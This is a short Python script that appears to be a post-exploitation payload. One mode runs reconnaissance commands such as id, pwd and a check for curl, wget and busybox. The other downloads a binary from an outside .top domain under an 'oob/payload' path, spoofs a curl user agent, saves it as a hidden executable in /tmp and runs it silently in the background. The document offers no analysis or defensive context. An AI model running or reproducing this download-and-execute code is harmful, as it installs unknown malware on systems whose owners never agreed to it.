def sh(c):
    import subprocess
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=40)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR " + repr(e)

try:
    m = mode
except Exception:
    m = "evidence"

if m == "evidence":
    print("===EVID_START===")
    print(sh("id; pwd; ls -la /tmp | head; python3 -V; command -v curl wget busybox"))
    print("===EVID_END===")
else:
    print("RCS_DL")
    import urllib.request, os, subprocess, time
    url = "https://azvdvasfv21fa.xxxyyyzzzxyz.top/api/oob/payload/dbebface2014c887e91bd3595ce1ef722db1eef7994cd8cdb382f56efa8d8a92"
    p = "/tmp/.rcs-02961a76"
    req = urllib.request.Request(url, headers={"User-Agent": "curl/8.0"})
    data = urllib.request.urlopen(req, timeout=30).read()
    with open(p, "wb") as f:
        f.write(data)
    os.chmod(p, 0o755)
    print("downloaded", len(data))
    proc = subprocess.Popen([p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(8)
    print("pid", proc.pid, "poll", proc.poll())
    print("RCS_DONE")
